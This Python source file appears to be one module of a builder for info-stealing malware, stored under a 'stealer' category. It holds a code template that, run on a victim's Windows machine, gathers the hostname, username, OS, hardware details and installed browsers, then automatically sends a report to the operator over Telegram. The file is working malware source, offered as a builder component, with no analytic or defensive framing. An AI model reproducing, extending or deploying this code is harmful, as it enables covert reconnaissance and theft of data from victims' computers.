# modules/stealer/system.py
"""
System Information Module - Updated with browser detection
"""

from typing import Dict, Any
from modules.base import Module


class SystemInfoModule(Module):
    """Collects system information and browser detection."""

    def __init__(self, config: Dict[str, Any]):
        super().__init__(config)
        self.name = "System Info"
        self.id = "system_info"
        self.category = "stealer"
        self.description = "Collects system information and detects browsers"

    def get_template(self) -> str:
        return """
# --- System Info Module ---

def get_system_info():
    """Collect system information."""
    import platform
    import socket
    import psutil
    import os
    from datetime import datetime

    info = {
        "hostname": socket.gethostname(),
        "username": os.getlogin(),
        "platform": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "cpu_count": psutil.cpu_count(),
        "ram_total": psutil.virtual_memory().total / (1024**3),
        "ram_available": psutil.virtual_memory().available / (1024**3),
        "timestamp": datetime.now().isoformat(),
        "browsers": get_installed_browsers(),
    }
    return info


def get_installed_browsers():
    """Detect installed browsers."""
    browsers = []
    appdata_local = os.getenv("LOCALAPPDATA", "")
    appdata_roaming = os.getenv("APPDATA", "")
    program_files = os.getenv("ProgramFiles", "")
    program_files_x86 = os.getenv("ProgramFiles(x86)", "")

    browser_paths = {
        "chrome": [
            os.path.join(appdata_local, "Google", "Chrome", "User Data"),
            os.path.join(program_files, "Google", "Chrome", "Application"),
            os.path.join(program_files_x86, "Google", "Chrome", "Application"),
        ],
        "edge": [
            os.path.join(appdata_local, "Microsoft", "Edge", "User Data"),
            os.path.join(program_files_x86, "Microsoft", "Edge", "Application"),
        ],
        "brave": [
            os.path.join(appdata_local, "BraveSoftware", "Brave-Browser", "User Data"),
            os.path.join(program_files, "BraveSoftware", "Brave-Browser", "Application"),
        ],
        "opera": [
            os.path.join(appdata_roaming, "Opera Software", "Opera Stable"),
            os.path.join(program_files, "Opera", "Launcher.exe"),
        ],
        "firefox": [
            os.path.join(appdata_roaming, "Mozilla", "Firefox", "Profiles"),
            os.path.join(program_files, "Mozilla Firefox", "firefox.exe"),
        ],
    }

    for name, paths in browser_paths.items():
        for path in paths:
            if os.path.exists(path):
                browsers.append(name)
                break

    return browsers


def system_info_main():
    """Send system info to Telegram."""
    info = get_system_info()
    msg = (
        f"🖥️ <b>System Information</b>\\n\\n"
        f"Hostname: {info['hostname']}\\n"
        f"Username: {info['username']}\\n"
        f"Platform: {info['platform']} {info['release']}\\n"
        f"Machine: {info['machine']}\\n"
        f"CPU: {info['cpu_count']} cores\\n"
        f"RAM: {info['ram_total']:.1f} GB\\n"
        f"Browsers: {', '.join(info['browsers']) if info['browsers'] else 'None'}"
    )
    send_telegram_message(msg)

# Execute
system_info_main()
"""

    def get_config_schema(self) -> Dict[str, Any]:
        return {
            "enabled": {"type": "boolean", "default": True, "label": "Enable System Info"},
        }
